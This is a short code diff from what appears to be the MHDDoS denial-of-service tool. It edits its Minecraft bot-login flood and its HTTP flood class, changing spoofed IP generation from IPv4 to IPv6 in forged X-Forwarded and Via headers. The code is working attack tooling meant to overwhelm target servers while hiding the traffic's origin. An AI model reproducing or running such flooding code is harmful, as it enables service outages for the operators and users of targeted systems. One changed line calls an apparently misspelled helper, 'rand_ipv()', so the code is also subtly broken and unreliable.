@@ -403,7 +403,7 @@ class Layer4(Thread):
             Tools.send(s, Minecraft.handshake_forwarded(self._target,
                                                         47,
                                                         2,
-                                                        ProxyTools.Random.rand_ipv4(),
+                                                        ProxyTools.Random.rand_ipv(),
                                                         uuid4()))
             Tools.send(s, Minecraft.login(f"MHDDoS_{ProxyTools.Random.rand_str(5)}"))
             sleep(1.5)
@@ -564,7 +564,7 @@ class HttpFlood(Thread):
 
     @property
     def SpoofIP(self) -> str:
-        spoof: str = ProxyTools.Random.rand_ipv4()
+        spoof: str = ProxyTools.Random.rand_ipv6()
         return ("X-Forwarded-Proto: Http\r\n"
                 f"X-Forwarded-Host: {self._target.raw_host}, 1.1.1.1\r\n"
                 f"Via: {spoof}\r\n"
